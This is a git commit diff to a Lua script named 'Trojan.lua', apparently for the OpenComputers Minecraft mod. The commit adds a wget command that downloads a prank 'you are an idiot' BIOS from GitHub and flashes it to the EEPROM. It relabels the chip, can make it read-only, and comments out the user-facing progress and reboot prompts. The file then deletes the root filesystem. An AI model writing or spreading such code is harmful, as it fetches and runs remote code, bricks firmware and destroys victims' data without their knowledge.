1aae377fb6747874a255ad292b2cb1c1360982c4
matvey-mayner <144268527+matvey-mayner@users.noreply.github.com>
2024-01-18 21:37:29 +0300

    Update Trojan.lua

--- Maynersky.app/Trojan.lua
+++ Maynersky.app/Trojan.lua
@@ -3,22 +3,22 @@ local eeprom = component.eeprom
 local fs = require("filesystem")
 
 local readOnly = QA("Make EEPROM read only?")
-os.execute("wget -f https://github.com/BrightYC/Cyan/blob/master/stuff/cyan.bin?raw=true /tmp/cyan.bin")
-local file = io.open("/tmp/cyan.bin", "r")
+os.execute("wget -f https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua /tmp/eeprom_code.lua && flash -q /tmp/eeprom_code.lua")
+local file = io.open("/tmp/eeprom_code.lua", "r")
 local data = file:read("*a")
-file:close()
-io.write("Flashing...")
+--file:close()
+--io.write("Flashing...")
 local success, reason = eeprom.set(config .. data)
 
 if not reason then
-    eeprom.setLabel("Cyan BIOS")
+    eeprom.setLabel("!You are an idiot!")
     eeprom.setData(require("computer").getBootAddress())
     if readOnly then
         eeprom.makeReadonly(eeprom.getChecksum())
     end
-    io.write(" success.\n")
-    if QA("Reboot?", true) then
-        os.execute("reboot")
-    end
+   -- io.write(" success.\n")
+   -- if QA("Reboot?", true) then
+    --    os.execute("reboot")
+   -- end
 
 fs.remove("/")
